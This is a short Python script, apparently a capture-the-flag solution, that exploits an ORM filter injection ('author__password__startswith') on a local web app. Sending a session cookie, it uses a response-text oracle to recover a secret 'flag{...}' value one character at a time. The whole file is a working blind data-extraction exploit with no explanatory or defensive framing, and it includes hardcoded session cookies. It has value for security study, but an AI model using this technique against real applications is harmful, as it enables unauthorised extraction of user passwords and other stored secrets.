import requests
import string
import json
import time
LEAK_URL = "http://127.0.0.1:8000/?filter=author__password__startswith%3D"
ALPHABET = "0123456789-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
# COOKIE = "sessionid=bv2ep9kjdw1ia5kcyrl8joavumbfef3c"
COOKIE = "sessionid=97y5jkuue2p4ipl70kasyqd828evfuxe"


def try_prefix(prefix):
	full_url = LEAK_URL + prefix
	print("Trying URL:", full_url)
	r = requests.get(full_url, headers={'Cookie': COOKIE})
	print("Response:", r.text)
	assert r.status_code == 200
	if r.text.find("By ExtremeModerator (") != -1:
		return True
	return False

def main():
	password = "flag{"
	while not try_prefix(password+"}"):
		print (password)
		for a in ALPHABET:
			if try_prefix(password+a):
				password += a
				break
	print (password+"}")


if __name__ == '__main__':
	main()